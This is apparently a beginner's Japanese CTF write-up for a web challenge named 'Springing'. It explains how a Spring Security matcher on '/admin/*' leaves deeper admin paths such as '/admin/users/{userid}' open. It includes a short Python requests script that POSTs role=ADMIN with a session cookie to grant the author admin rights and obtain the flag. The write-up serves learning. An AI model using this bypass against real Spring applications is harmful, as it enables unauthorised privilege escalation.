# Springing
🌸🌸🌸🌸🌸🌸🌸

## 解説
まずアカウントを作ってサインインすると、ユーザーID、roleが出ていました。
サイト自体はこの程度みたいなので、とりあえず`SecurityConfig.java`を読んでみます。
```java
@Configuration
public class SecurityConfig {
    @Bean
    SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                .csrf(AbstractHttpConfigurer::disable)
                .authorizeHttpRequests(authorize -> authorize
                        .requestMatchers("/user/login", "/user/register").permitAll()
                        .requestMatchers("/admin", "/admin/*").hasRole("ADMIN")
                        .anyRequest().authenticated())
                .formLogin(form -> form
                        .loginPage("/user/login")
                        .defaultSuccessUrl("/", true))
                .logout(logout -> logout
                        .logoutUrl("/user/logout")
                        .logoutSuccessUrl("/user/login"));
        return http.build();
    }
```
私はJavaの知識が全くと言っていいほど無いので、一旦AIに投げてみました。
すると、これはADMINロールを持っている人だけがアクセスできるサイトを設定しているもので、
`/admin/example/example2`などの二階層以上下のサイトには制限がかかっていないことが脆弱性らしいです。なるほど。

ここで、`AdminController.java`も読んでみます。すると、このようなプログラムがありました。
```java
@PostMapping("/admin/users/{userid}")
    public ResponseEntity<Void> changeRole(
            @PathVariable UUID userid,
            @RequestParam String role) {
        users.changeRole(userid, role)
                .orElseThrow(() -> new ResponseStatusException(NOT_FOUND, "user not found"));
        return ResponseEntity.status(SEE_OTHER)
                .location(URI.create("/admin/users"))
                .build();
```
なので、`/admin/users/{userid}`にアクセス可能です。
そして`users.html`を見てみると、GUESTとADMINをいじれるみたいなサイトでした。

なので、ここにADMINのリクエストを送れば良さそうです。

## 攻略
とりあえずADMINになってみます。
```python
import requests

url = "http://34.170.146.252:37059/admin/users/{userid}"
cookies = {"JSESSIONID": "{SESSIONID}"}

req = requests.post(url, cookies=cookies, data={"role": "ADMIN"}) 
```
サイトを再読み込みすると、無事GUESTからADMINになれたようです。

なので、早速`/admin`にアクセス---
と行きたいのですが、このままだと403エラーが出てしまいます。(セッションが更新されないためだそうです)
なので、一度アカウントからサインアウトします。

そしてもう一度サインインして、`/admin`にアクセスすると、無事にFlagを手に入れられました。

ちなみに私はサインアウトしないとアクセスできないことに気づかず、10分くらい止まってしまいました。(一敗)

## あとがき
今回、初めてWriteUpを投稿させていただきました。
まだまだ始めて一ヶ月ほどの初心者なので、WriteUp等に無駄な行動なども多いと思いますが、これからも何卒よろしくお願いします。
